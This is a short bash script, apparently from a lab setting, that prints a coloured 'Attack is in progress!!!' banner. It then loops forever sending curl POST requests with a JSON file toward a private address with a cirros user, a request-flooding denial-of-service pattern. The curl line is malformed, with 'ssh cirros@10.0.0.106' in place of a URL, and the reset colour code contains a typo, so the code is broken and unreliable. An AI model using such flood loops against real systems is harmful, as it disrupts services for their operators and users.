Red=$'\e[1;31m'
Green=$'\e[1;32m'
Blue=$'\e[1;34m'
Yellow=$'\e[1;33m'
Reset=$'\e[0,m'

echo "$Yellow ##################################################### $Reset"
echo "$Red Attack is in progress!!! $Reset"
echo "$Yellow #####################################################  $Reset"


while :
do
	curl -X POST -d @req.json ssh cirros@10.0.0.106
done
